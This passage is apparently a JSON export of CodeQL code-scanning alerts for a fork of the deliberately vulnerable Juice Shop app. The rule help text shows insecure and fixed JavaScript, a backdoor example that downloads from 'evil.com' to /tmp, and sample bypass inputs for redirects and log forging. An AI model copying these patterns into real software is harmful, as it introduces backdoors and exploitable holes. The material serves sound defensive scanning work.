{
  "code_scanning": [
    {
      "number": 114,
      "created_at": "2025-06-11T06:32:22Z",
      "updated_at": "2025-06-11T06:32:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/114",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/114",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/regex/missing-regexp-anchor",
        "severity": "warning",
        "description": "Missing regular expression anchor",
        "name": "js/regex/missing-regexp-anchor",
        "tags": [
          "correctness",
          "external/cwe/cwe-020",
          "security"
        ],
        "full_description": "Regular expressions without anchors can be vulnerable to bypassing.",
        "help": "# Missing regular expression anchor\nSanitizing untrusted input with regular expressions is a common technique. However, it is error-prone to match untrusted input against regular expressions without anchors such as `^` or `$`. Malicious input can bypass such security checks by embedding one of the allowed patterns in an unexpected location.\n\nEven if the matching is not done in a security-critical context, it may still cause undesirable behavior when the regular expression accidentally matches.\n\n\n## Recommendation\nUse anchors to ensure that regular expressions match at the expected locations.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.\n\n\n```javascript\napp.get(\"/some/path\", function(req, res) {\n    let url = req.param(\"url\");\n    // BAD: the host of `url` may be controlled by an attacker\n    if (url.match(/https?:\\/\\/www\\.example\\.com\\//)) {\n        res.redirect(url);\n    }\n});\n\n```\nThe check with the regular expression match is, however, easy to bypass. For example by embedding `http://example.com/` in the query string component: `http://evil-example.net/?x=http://example.com/`. Address these shortcomings by using anchors in the regular expression instead:\n\n\n```javascript\napp.get(\"/some/path\", function(req, res) {\n    let url = req.param(\"url\");\n    // GOOD: the host of `url` can not be controlled by an attacker\n    if (url.match(/^https?:\\/\\/www\\.example\\.com\\//)) {\n        res.redirect(url);\n    }\n});\n\n```\nA related mistake is to write a regular expression with multiple alternatives, but to only include an anchor for one of the alternatives. As an example, the regular expression `/^www\\.example\\.com|beta\\.example\\.com/` will match the host `evil.beta.example.com` because the regular expression is parsed as `/(^www\\.example\\.com)|(beta\\.example\\.com)/`\n\n\n## References\n* MDN: [Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/codeql-analysis.yml:analyze",
        "environment": "{\"language\":\"javascript-typescript\"}",
        "category": ".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript",
        "state": "open",
        "commit_sha": "153fd2940fa1812378b2877118ccf02799457e61",
        "message": {
          "text": "When this is used as a regular expression on a URL, it may match anywhere, and arbitrary hosts may come before or after it."
        },
        "location": {
          "path": "test/cypress/e2e/redirect.spec.ts",
          "start_line": 19,
          "end_line": 19,
          "start_column": 32,
          "end_column": 54
        },
        "classifications": [
          "test"
        ]
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/114/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 113,
      "created_at": "2025-06-11T06:32:22Z",
      "updated_at": "2025-06-11T06:32:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/113",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/113",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/user-controlled-bypass",
        "severity": "error",
        "description": "User-controlled bypass of security check",
        "name": "js/user-controlled-bypass",
        "tags": [
          "external/cwe/cwe-290",
          "external/cwe/cwe-807",
          "security"
        ],
        "full_description": "Conditions that the user controls are not suited for making security-related decisions.",
        "help": "# User-controlled bypass of security check\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/codeql-analysis.yml:analyze",
        "environment": "{\"language\":\"javascript-typescript\"}",
        "category": ".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript",
        "state": "open",
        "commit_sha": "153fd2940fa1812378b2877118ccf02799457e61",
        "message": {
          "text": "This condition guards a sensitive action, but a user-provided value controls it."
        },
        "location": {
          "path": "routes/verify.ts",
          "start_line": 113,
          "end_line": 113,
          "start_column": 7,
          "end_column": 12
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/113/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 112,
      "created_at": "2025-06-11T06:32:22Z",
      "updated_at": "2025-06-11T06:32:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/112",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/112",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/user-controlled-bypass",
        "severity": "error",
        "description": "User-controlled bypass of security check",
        "name": "js/user-controlled-bypass",
        "tags": [
          "external/cwe/cwe-290",
          "external/cwe/cwe-807",
          "security"
        ],
        "full_description": "Conditions that the user controls are not suited for making security-related decisions.",
        "help": "# User-controlled bypass of security check\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/codeql-analysis.yml:analyze",
        "environment": "{\"language\":\"javascript-typescript\"}",
        "category": ".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript",
        "state": "open",
        "commit_sha": "153fd2940fa1812378b2877118ccf02799457e61",
        "message": {
          "text": "This condition guards a sensitive action, but a user-provided value controls it."
        },
        "location": {
          "path": "routes/fileServer.ts",
          "start_line": 27,
          "end_line": 27,
          "start_column": 9,
          "end_column": 13
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/112/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 111,
      "created_at": "2025-06-11T06:32:22Z",
      "updated_at": "2025-06-11T06:32:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/111",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/111",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/user-controlled-bypass",
        "severity": "error",
        "description": "User-controlled bypass of security check",
        "name": "js/user-controlled-bypass",
        "tags": [
          "external/cwe/cwe-290",
          "external/cwe/cwe-807",
          "security"
        ],
        "full_description": "Conditions that the user controls are not suited for making security-related decisions.",
        "help": "# User-controlled bypass of security check\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/codeql-analysis.yml:analyze",
        "environment": "{\"language\":\"javascript-typescript\"}",
        "category": ".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript",
        "state": "open",
        "commit_sha": "153fd2940fa1812378b2877118ccf02799457e61",
        "message": {
          "text": "This condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it."
        },
        "location": {
          "path": "lib/insecurity.ts",
          "start_line": 190,
          "end_line": 190,
          "start_column": 7,
          "end_column": 12
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/111/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 110,
      "created_at": "2025-06-11T06:32:22Z",
      "updated_at": "2025-06-11T06:32:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/110",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/110",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/user-controlled-bypass",
        "severity": "error",
        "description": "User-controlled bypass of security check",
        "name": "js/user-controlled-bypass",
        "tags": [
          "external/cwe/cwe-290",
          "external/cwe/cwe-807",
          "security"
        ],
        "full_description": "Conditions that the user controls are not suited for making security-related decisions.",
        "help": "# User-controlled bypass of security check\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/codeql-analysis.yml:analyze",
        "environment": "{\"language\":\"javascript-typescript\"}",
        "category": ".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript",
        "state": "open",
        "commit_sha": "153fd2940fa1812378b2877118ccf02799457e61",
        "message": {
          "text": "This condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it."
        },
        "location": {
          "path": "lib/insecurity.ts",
          "start_line": 57,
          "end_line": 57,
          "start_column": 42,
          "end_column": 47
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/110/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 109,
      "created_at": "2025-06-11T06:32:22Z",
      "updated_at": "2025-06-11T06:32:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/109",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/109",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/file-system-race",
        "severity": "warning",
        "description": "Potential file system race condition",
        "name": "js/file-system-race",
        "tags": [
          "external/cwe/cwe-367",
          "security"
        ],
        "full_description": "Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.",
        "help": "# Potential file system race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nUse file descriptors instead of file names whenever possible.\n\n\n## Example\nThe following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\nif (!fs.existsSync(filePath)) {\n  fs.writeFileSync(filePath, \"Hello\", { mode: 0o600 });\n}\n\n```\nHowever, in a multi-user environment the file might be created by another user between the existence check and the write.\n\nThis can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\ntry {\n  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);\n\n  fs.writeFileSync(fd, \"Hello\");\n} catch (e) {\n  // file existed\n}\n\n```\n\n## References\n* Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* NodeJS: [The FS module](https://nodejs.org/api/fs.html).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/codeql-analysis.yml:analyze",
        "environment": "{\"language\":\"javascript-typescript\"}",
        "category": ".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript",
        "state": "open",
        "commit_sha": "153fd2940fa1812378b2877118ccf02799457e61",
        "message": {
          "text": "The file may have changed since it was checked."
        },
        "location": {
          "path": "lib/codingChallenges.ts",
          "start_line": 29,
          "end_line": 29,
          "start_column": 28,
          "end_column": 57
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/109/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 108,
      "created_at": "2025-06-11T06:32:22Z",
      "updated_at": "2025-06-11T06:32:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/108",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/108",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/http-to-file-access",
        "severity": "warning",
        "description": "Network data written to file",
        "name": "js/http-to-file-access",
        "tags": [
          "external/cwe/cwe-434",
          "external/cwe/cwe-912",
          "security"
        ],
        "full_description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
        "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n",
        "security_severity_level": "medium"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/codeql-analysis.yml:analyze",
        "environment": "{\"language\":\"javascript-typescript\"}",
        "category": ".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript",
        "state": "open",
        "commit_sha": "153fd2940fa1812378b2877118ccf02799457e61",
        "message": {
          "text": "Write to file system depends on Untrusted data."
        },
        "location": {
          "path": "routes/profileImageFileUpload.ts",
          "start_line": 31,
          "end_line": 31,
          "start_column": 26,
          "end_column": 32
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/108/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 107,
      "created_at": "2025-06-11T06:32:22Z",
      "updated_at": "2025-06-11T06:32:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/107",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/107",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/http-to-file-access",
        "severity": "warning",
        "description": "Network data written to file",
        "name": "js/http-to-file-access",
        "tags": [
          "external/cwe/cwe-434",
          "external/cwe/cwe-912",
          "security"
        ],
        "full_description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
        "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n",
        "security_severity_level": "medium"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/codeql-analysis.yml:analyze",
        "environment": "{\"language\":\"javascript-typescript\"}",
        "category": ".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript",
        "state": "open",
        "commit_sha": "153fd2940fa1812378b2877118ccf02799457e61",
        "message": {
          "text": "Write to file system depends on Untrusted data."
        },
        "location": {
          "path": "routes/fileUpload.ts",
          "start_line": 35,
          "end_line": 35,
          "start_column": 22,
          "end_column": 28
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/107/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 106,
      "created_at": "2025-06-11T06:32:22Z",
      "updated_at": "2025-06-11T06:32:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/106",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/106",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/log-injection",
        "severity": "error",
        "description": "Log injection",
        "name": "js/log-injection",
        "tags": [
          "external/cwe/cwe-117",
          "security"
        ],
        "full_description": "Building log entries from user-controlled sources is vulnerable to insertion of forged log entries by a malicious user.",
        "help": "# Log injection\nIf unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.\n\nForgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.\n\n\n## Recommendation\nUser input should be suitably sanitized before it is logged.\n\nIf the log entries are in plain text then line breaks should be removed from user input, using `String.prototype.replace` or similar. Care should also be taken that user input is clearly marked in log entries.\n\nFor log entries that will be displayed in HTML, user input should be HTML-encoded before being logged, to prevent forgery and other forms of HTML injection.\n\n\n## Example\nIn the first example, a username, provided by the user, is logged using \\`console.info\\`. In the first case, it is logged without any sanitization. In the second case, the username is used to build an error that is logged using \\`console.error\\`. If a malicious user provides \\`username=Guest%0a\\[INFO\\]+User:+Admin%0a\\` as a username parameter, the log entry will be splitted in two different lines, where the second line will be \\`\\[INFO\\]+User:+Admin\\`.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    console.info(`[INFO] User: ${q.query.username}`); // BAD: User input logged as-is\n})\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\nIn the second example, `String.prototype.replace` is used to ensure no line endings are present in the user input.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    // GOOD: remove newlines from user controlled input before logging\n    let username = q.query.username.replace(/\\n|\\r/g, \"\");\n\n    console.info(`[INFO] User: ${username}`);\n});\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\n\n## References\n* OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).\n* Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).\n",
        "security_severity_level": "medium"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/codeql-analysis.yml:analyze",
        "environment": "{\"language\":\"javascript-typescript\"}",
        "category": ".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript",
        "state": "open",
        "commit_sha": "153fd2940fa1812378b2877118ccf02799457e61",
        "message": {
          "text": "Log entry depends on a user-provided value."
        },
        "location": {
          "path": "lib/challengeUtils.ts",
          "start_line": 85,
          "end_line": 85,
          "start_column": 15,
          "end_column": 62
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/106/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 105,
      "created_at": "2025-06-11T06:32:22Z",
      "updated_at": "2025-06-11T06:32:22Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/105",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/105",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/remote-property-injection",
        "severity": "warning",
        "description": "Remote property injection",
        "name": "js/remote-property-injection",
        "tags": [
          "external/cwe/cwe-250",
          "external/cwe/cwe-400",
          "security"
        ],
        "full_description": "Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.",
        "help": "# Remote property injection\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // 